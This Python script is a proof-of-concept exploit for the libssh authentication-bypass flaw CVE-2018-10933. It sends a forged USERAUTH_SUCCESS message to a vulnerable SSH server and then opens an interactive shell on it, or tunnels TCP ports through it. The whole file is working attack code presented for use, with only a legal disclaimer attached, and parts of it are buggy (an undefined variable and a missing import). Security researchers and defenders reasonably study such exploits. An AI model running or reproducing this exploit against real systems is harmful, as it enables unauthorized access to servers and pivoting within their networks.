#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" CVE-2018-10933-SHELL-POC.py

    Quick and dirty exploit for libssh <0.8.4 or <0.7.6 server-side
    authentication-bypass vulnerability (CVE-2018-10933).

    See https://github.com/e3prom/miscsec/tree/master/CVE-2018-10933
    for more information.

    Disclaimer: the use of this exploit on a server without the
    owner's authorization may be illegal in your juridication.
    Please check your local laws and regulation before using this
    software.

"""
import paramiko
import socket
import sys
import time
import argparse

# Python 2/3 support
from six.moves import input
try:
    import SocketServer
except ImportError:
    import socketserver as SocketServer

sock = socket.socket()

class ForwardServer(SocketServer.ThreadingTCPServer):
    deamon_threads = True
    allow_reuse_address = True

class Handler(SocketServer.BaseRequestHandler):
    def handle(self):
        try:
            channel = self.ssh_transport.open_channel(
                "direct-tcpip",     # open direct-tcpip channel
                (self.chain_host, self.chain_port),
                self.request.getpeername())
        except Exception as error:  # channel failed or unsupported
            print("[-] Request for %s:%d failed.\n    Error: %s" % (
                  self.chain_host,
                  self.chain_port, repr(error)))
            return

        if channel is None:
            print("[-] Request for %s:%d rejected by the server." % (
                  self.chain_host,
                  self.chain_port))
            return

        # Port forwarding sucessfully negociated
        print("Tunnel open %r <-> %r for %r") % (
              self.request.getpeername(),
              chan.getpeername(),
              (self.chain_host, self.chain_port))

        while True:
            r, w, x = select.select([self.request, channel], [], [])
            if self.request in r:
                data = self.request.recv(1024)
                if len(data) == 0:
                    break
                channel.send(data)
            if channel in r:
                data = channel.recv(1024)
                if len(data) == 0:
                    break
                self.request.send(data)

        peername = self.request.getpeername()
        channel.close()
        self.request.close()
        print("Tunnel closed for %s" % peername)

def get_shell(transport):
    try:
        # open channel session
        channel = transport.open_session()

        # request PTY
        channel.get_pty()

        # request shell
        channel.invoke_shell()

        # print user instructions
        if args.verbose: print("[*] Type 'quit' to exit this command prompt.\n")

        while True:
            # when in verbose mode, print command prompt
            if args.verbose:
                command = input('$ ')
            else:
                command = input()

            # break when 'quit' is entered.
            if command == 'quit':
                break

            # send command, including new-line character.
            channel.send(command + '\n')

            # while loop: when the channel is ready, print returned data.
            while True:
                if channel.recv_ready():
                    output = channel.recv(1024).decode('utf-8')
                    # make sure there's a carriage-return and that we strip
                    # the prompt symbol before and after the returned output.
                    sys.stdout.write('\r' + output[len(command)+2:-2] + '' * 16)
                    sys.stdout.flush()
                else:
                    time.sleep(0.2)
                    if not(channel.recv_ready()):
                        break

        # close transport
        transport.close()
    except: # placeholder for future exception handling.
        pass

def tunnel(local_port, remote_host, remote_port, transport):
    class SubHandler(Handler):
        chain_host = remote_host
        chain_port = remote_port
        ssh_transport = transport

    ForwardServer(("", local_port), SubHandler).serve_forever()

def start():
    try:
        # establish TCP socket
        sock.connect((args.hostname, int(args.port)))
        # instantiate SSH transport
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        # build out-of-state USERAUTH_SUCCESS message
        m = paramiko.message.Message()
        m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)

        # send USERAUTH_SUCCESS message
        transport._send_message(m)

        if args.port_forwarding:
            # parse host:port command-line argument
            host_port = args.port_forwarding.split(':')
            try:
                if args.verbose: print("[*] Tunneling %s:%d on tcp/%d" % (
                    host_port[1],
                    int(host_port[2]),
                    int(host_port[0])
                ))
                tunnel(int(host_port[0]), host_port[1], int(host_port[2]),
                       transport)
            except ValueError:
                print("[-] Invalid port forwarding declaration.")
        else:
            get_shell(transport)

    # Handle exceptions and CTRL-C
    except socket.error:
        print("[-] Connection to %s on port %d failed." % (
              args.hostname, args.port))
        sys.exit(1)
    except KeyboardInterrupt:
        if args.verbose: print('\nExiting...')
        sys.exit(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CVE-2018-10933 Exploit PoC')
    parser.add_argument('--verbose', help='enable verbose output', action='store_true')
    parser.add_argument('-p', '--port', help='port to connect to (default: 2222)', type=int, default=2222)
    parser.add_argument('-L', dest='port_forwarding', help='Enable TCP forwarding for (bind_port:remote_addr:remote_port)')
    parser.add_argument('hostname', help='server IP address or hostname')
    args = parser.parse_args()

    start()
